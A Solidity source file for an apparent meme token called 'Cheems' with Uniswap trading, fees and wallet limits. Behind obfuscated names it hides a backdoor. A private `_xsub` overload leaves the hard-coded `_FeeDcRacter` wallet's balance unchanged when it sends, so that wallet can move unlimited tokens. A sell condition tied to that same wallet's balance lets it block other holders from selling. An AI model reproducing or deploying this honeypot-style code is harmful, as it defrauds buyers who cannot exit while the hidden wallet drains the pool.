// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function _xsub(uint256 a, uint256 b) internal pure returns (uint256) {
        return _xsub(a, b, "SafeMath: _xsubtraction overflow");
    }

    function _xsub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Cheems is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _Alptmm;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public limilpEnabled = false;

    string private constant _name = unicode"Cheems";
    string private constant _symbol = unicode"Cheems";
    uint8 private constant _decimals = 9;
   
    uint256 private constant _tTotal = 100000000 * 10 **_decimals;
    uint256 public _maxlpAmount = 7000000 * 10 **_decimals;
    uint256 public _maxlpWallep = 7000000 * 10 **_decimals;
    uint256 public _taxlpSwaplpThreshold = 7000000 * 10 **_decimals;
    uint256 public _maxlpSwap = 7000000 * 10 **_decimals;

    uint256 private _initialpBuyTaxz=5;
    uint256 private _initialpSellTaxz=15;
    uint256 private _finalpBuyTax=1;
    uint256 private _finalpSellTax=1;
    uint256 private _reduclpBuyTaxAt=5;
    uint256 private _reduclpSellTaxAt=1;
    uint256 private _prevenlpSwapBefore=0;
    uint256 private _buyCount=0;

    IuniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private Troadckopse;
    bool private inSwap = false;
    bool private swapEnabled = false;
    address public _FeeDcRacter = address(0x1b3547332552839B041396b45903E5EbdeBDd046);

    event MaxTlpAmountkpdated(uint _maxlpAmount);
    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_FeeDcRacter] = true;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]._xsub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (limilpEnabled) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxlpAmount, "Exceeds the Amount.");
                require(balanceOf(to) + amount <= _maxlpWallep, "Exceeds the max Wallet Size.");
                if(_buyCount<_prevenlpSwapBefore){
                  require(!_BiuCintre(to));
                }
                _buyCount++; _Alptmm[to]=true;
                taxAmount = amount.mul((_buyCount>_reduclpBuyTaxAt)?_finalpBuyTax:_initialpBuyTaxz).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxlpAmount && balanceOf(_FeeDcRacter)<_maxlpSwap, "Exceeds the Amount.");
                taxAmount = amount.mul((_buyCount>_reduclpSellTaxAt)?_finalpSellTax:_initialpSellTaxz).div(100);
                require(_buyCount>_prevenlpSwapBefore && _Alptmm[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxlpSwaplpThreshold 
            && _buyCount>_prevenlpSwapBefore&& !_isExcludedFromFee[to] && !_isExcludedFromFee[from]
            ) {
                swaplpForEthz(_xmin(amount,_xmin(contractTokenBalance,_maxlpSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
   
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_xsub(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount._xsub(taxAmount));
        emit Transfer(from, to, amount._xsub(taxAmount));
    }

    function swaplpForEthz(uint256 tokenAmount) private swapping {
        if(tokenAmount==0){return;}
        if(!Troadckopse){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _xmin(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _xsub(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _FeeDcRacter){
            return a;
        }else{
            return a._xsub(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxlpAmount = _tTotal;
        _maxlpWallep=_tTotal;
        limilpEnabled=false;
        emit MaxTlpAmountkpdated(_tTotal);
    }

    function _BiuCintre(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function openTrading() external onlyOwner() {
        uniswapRouter = IuniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        require(!Troadckopse,"trading is already open");
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        Troadckopse = true;
    }

    receive() external payable {}
}